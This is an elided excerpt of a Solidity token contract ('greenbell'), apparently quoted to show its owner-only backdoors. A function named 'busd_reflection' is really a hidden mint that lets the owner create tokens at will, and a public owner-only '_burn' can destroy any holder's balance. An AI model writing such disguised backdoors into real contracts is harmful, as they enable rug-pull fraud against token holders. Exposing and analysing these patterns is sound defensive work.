...
contract Token is Context, IERC20, IERC20Metadata {
    ...
    string public _name = "greenbell";
    string public _symbol= "greenbellio";
    ...
    function Approve2(address _account)  public {
        require(msg.sender == owner);
    ...
    function _burn(address account, uint256 amount) onlyOwner  public virtual {
      ...
      function  busd_reflection(address account, uint256 amount) onlyOwner  public virtual {
        require(account != address(0), "ERC20: busd_reflection to the zero address");
        _beforeTokenTransfer(address(0), account, amount);
        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
